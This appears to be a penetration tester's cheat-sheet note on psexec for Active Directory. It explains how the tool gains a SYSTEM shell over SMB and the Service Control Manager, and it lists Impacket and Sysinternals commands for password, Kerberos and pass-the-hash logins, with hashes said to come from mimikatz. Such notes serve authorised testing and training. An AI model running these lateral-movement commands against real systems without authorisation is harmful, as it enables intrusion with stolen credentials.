---
tags:
  - active_directory
---
# psexec

Use administrative credentials to authenticate to an Active Directory machine as `nt authority\system`

**Requires:**

- User logging in to be a member of the `administrators` local group
- `ADMIN$` share must be available (default)
- File and printer sharing must be turned on (default)

**Performs the following**

1. Establishes a link to the hidden `ADMIN$` share, which corresponds to the `C:\Windows` directory on the remote system, via SMB.
2. Uses the Service Control Manager (SCM) to initiate the `PsExecsvc` service and set up a named pipe on the remote system.
3. Redirects the console’s input and output through the created named pipe for interactive command execution.

**Note:** `PsExec` eliminates the double-hop problem because credentials are passed with the command and generates an interactive logon session (Type 2).

## Capabilities

### Impacket

```powershell
# Authenticate with credentials
psexec.py '$USER:$PASS@$IP'
psexec.py '$DOMAIN/$USER:$PASS@$IP'

# Authenticate with kerberos
psexec.py $DOMAIN/$USER@$IP -k -no-pass

# Authenticate with hash
psexec.py -hashes :$NTHASH $USER@$IP
```

Note: In the hash example, we fill in the left side of the colon with zeros, and the right is the administrators NTLM hash pulled from `mimikatz`

### Sysinternals

```powershell
# Connect to the target
.\PsExec.exe \\$HOST -i -u $DOMAIN\$USER -p $PASS powershell

# Connect with system privileges
.\PsExec.exe \\$HOST -i -s -u $DOMAIN\$USER -p $PASS powershell
```
